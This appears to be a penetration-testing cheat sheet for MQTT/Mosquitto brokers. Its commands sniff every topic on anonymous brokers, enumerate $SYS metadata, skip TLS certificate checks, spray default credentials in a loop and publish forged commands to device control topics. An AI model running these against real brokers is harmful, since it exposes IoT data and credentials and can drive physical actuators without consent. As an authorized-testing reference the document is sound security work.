---
service: mqtt
title: MQTT (Mosquitto)
ports: 1883, 8883
aliases: mosquitto, mqtt-broker
---

# MQTT — quick wins

**When you see it:** 1883/tcp open and `mosquitto_sub -h H -t '#' -v` connects and starts
printing messages — the broker allows anonymous access and you can read every topic in real
time, including IoT sensor data, device commands, and potentially credentials in payloads.

> Authorized testing only. Triage is read-only; steps marked ✏️ publish messages to the
> target broker — injecting to command/control topics can cause physical actuators to
> respond; get explicit sign-off before publishing.

## Triage (read-only)
```sh
nmap -sV -p 1883,8883 H                           # confirm MQTT + version
mosquitto_sub -h H -t '#' -v                      # subscribe ALL topics; Ctrl-C after sampling
mosquitto_sub -h H -t '$SYS/#' -v                 # broker metadata: version, client count, uptime
mosquitto_sub -h H -t '$SYS/broker/version' -C 1  # single message, broker version string
```

## Quick wins

### Anonymous connect — sniff all topics
```sh
mosquitto_sub -h H -t '#' -v 2>&1 | tee mqtt-capture.txt
```
*Why:* `#` is the MQTT multi-level wildcard; on misconfigured brokers with
`allow_anonymous true` and no ACL, this single command delivers every message from every
topic — sensor readings, device state, user commands, and sometimes plaintext credentials.

### System topic enumeration
```sh
mosquitto_sub -h H -t '$SYS/#' -v -C 20
```
*Why:* `$SYS` is a standardized topic tree that exposes broker internals (connected clients,
subscriptions, bytes in/out, uptime, build info) with no additional auth — useful for
scoping the deployment before diving into data topics.

### Publish / inject message ✏️
```sh
mosquitto_pub -h H -t TOPIC -m "MESSAGE"
# example: push a fake command to a device control topic
mosquitto_pub -h H -t devices/DEVICE_ID/cmd -m '{"cmd":"restart"}'
```
*Why:* if the broker has no ACL preventing clients from publishing, any anonymous client
can inject messages into command/control topics — IoT devices subscribed to those topics
will act on the injected payload.

### TLS broker (8883) — connect with no client cert
```sh
mosquitto_sub -h H -p 8883 --cafile /etc/ssl/certs/ca-certificates.crt -t '#' -v
# if self-signed and you want to skip cert verification:
mosquitto_sub -h H -p 8883 --insecure -t '#' -v
```
*Why:* 8883 adds transport encryption but does not imply authentication; many TLS MQTT
deployments still allow anonymous sessions — `--insecure` bypasses cert validation on
self-signed BMC/IoT certificates.

### Authenticated broker — credential brute / spray
```sh
# try common IoT defaults first
for CRED in "admin:admin" "mqtt:mqtt" "user:user" "test:test"; do
  U=${CRED%%:*}; P=${CRED##*:}
  mosquitto_sub -h H -u "$U" -P "$P" -t '$SYS/broker/version' -C 1 2>&1 | grep -v "Connection refused\|error"
done
```
*Why:* MQTT password files (`mosquitto_passwd`) are bcrypt but the IoT default credential
set is small; a short spray often hits before needing a full wordlist attack.

## aranum helpers
- `aranumtoolkit/network/enum-mqtt.sh` — dispatcher that produced this finding (anonymous
  probe, `#` / `$SYS/#` topic sweep, credential spray, TLS detection).

## Gotchas
- `$SYS/#` topics are sometimes disabled (`sys_interval 0` in `mosquitto.conf`) — absence
  of `$SYS` output doesn't confirm auth is required.
- Some brokers allow anonymous subscribe but require auth to publish — test both directions
  independently before concluding on write access.
- High-frequency topics (sensor telemetry) can flood the terminal fast; pipe through
  `| head -100` or add `-C N` (capture N messages then exit) during triage.
- MQTT 5.0 adds `CONNACK` reason codes; a code `0x87` (Not Authorized) vs. `0x85` (Client
  Identifier Not Valid) distinguishes auth failure from config issues.
- ACLs are often per-topic prefix, not global — even on authenticated brokers, check whether
  your user can subscribe to `#` vs. only a narrow subtree.

## Sources
- HackTricks `1883-pentesting-mqtt-mosquitto`; kh4sh3i/MQTT-Pentesting (GitHub);
  SecurityCafe "IoT Pentesting 101: How to Hack MQTT"; Airbus Protect "Whispers of the
  Machines"; Vaishali Nagori Medium MQTT pentesting guide.
